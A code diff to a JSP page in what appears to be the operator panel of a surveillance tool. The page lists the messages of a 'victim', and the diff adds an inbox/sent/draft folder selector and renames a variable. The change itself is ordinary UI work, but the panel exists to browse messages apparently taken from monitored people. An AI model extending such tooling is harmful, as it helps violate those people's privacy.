@@ -1,9 +1,14 @@
-<%@ page import="java.util.List" %>
+<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Messages" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
+<%@ page import="com.theah64.xrob.api.models.Delivery" %>
+<%@ page import="com.theah64.xrob.api.models.Message" %>
+<%@ page import="com.theah64.xrob.api.models.Victim" %>
 <%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
-<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
-<%@ page import="com.theah64.xrob.api.database.tables.*" %>
-<%@ page import="com.theah64.xrob.api.models.*" %>
+<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
+<%@ page import="java.util.List" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -28,6 +33,11 @@
         $(document).ready(function () {
 
             <%=searchTemplate.getSearchScript()%>
+
+            $("select#sMessageTypes").on('change', function () {
+                var msgType = $(this).find(":selected").val();
+                window.location = "/client/victim/messages/" + msgType;
+            });
         });
 
 
@@ -42,7 +52,7 @@
 
             final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 2, 2);
             final String victimCode = pathInfoUtils.getPart(1);
-            final String msgType = pathInfoUtils.getPart(2);
+            final String currentMsgType = pathInfoUtils.getPart(2);
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
 
@@ -73,8 +83,34 @@
                 <%=searchTemplate.getTopTemplate(theVictim.getIdentity(),
                         lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>
 
+
+                <div class="row">
+
+                    <div class="form-group col-md-4">
+                        <label for="sMessageTypes">Folder</label>
+
+                        <select id="sMessageTypes" class="form-control">
+
+                            <%
+                                final String[] msgTypes = {"inbox", "sent", "draft"};
+                                for (final String msgTyp : msgTypes) {
+                            %>
+                            <%--TODO: Add message count :)--%>
+                            <option value="<%=victimCode + "/"+ msgTyp%>" <%=msgTyp.equals(currentMsgType) ? "selected" : ""%> ><%=msgTyp%>
+                            </option>
+
+                            <%
+                                }
+                            %>
+
+
+                        </select>
+
+                    </div>
+                </div>
+
                 <%
-                    final List<Message> messages = Messages.getInstance().getAll(theVictim.getId(), msgType);
+                    final List<Message> messages = Messages.getInstance().getAll(theVictim.getId(), currentMsgType);
                     if (messages != null) {
                 %>
                 <div class="row">
@@ -116,7 +152,7 @@
             </div>
             <%
                 } else {
-                    throw new PathInfo.PathInfoException("No contact found!");
+                    throw new PathInfo.PathInfoException("No message found!");
                 }
             %>
 
